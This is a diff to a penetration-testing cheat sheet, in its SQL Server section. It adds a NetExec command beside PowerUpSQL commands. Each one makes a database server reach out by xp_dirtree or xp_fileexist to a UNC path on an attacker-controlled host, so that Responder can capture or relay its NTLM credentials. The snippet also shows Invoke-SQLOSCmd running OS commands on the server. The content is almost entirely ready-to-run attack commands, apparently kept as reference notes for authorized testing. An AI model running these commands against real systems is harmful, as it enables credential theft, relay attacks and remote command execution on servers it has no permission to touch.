@@ -327,7 +327,8 @@ MySQL
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
-  or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`   
+  or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`
+  or: `nxc mssql -u user01 -p '<pw>' --dns-server 10.10.10.1 -d domain.tld -q 'EXEC xp_dirtree "\\10.10.10.10\hellofromnxc"' /home/kali/mssql_targets.txt`   
   
   SQL Command Execution:   
   `Invoke-SQLOSCmd -Instance "sql1.domain.local,1433" -Command "whoami" -RawResults`   
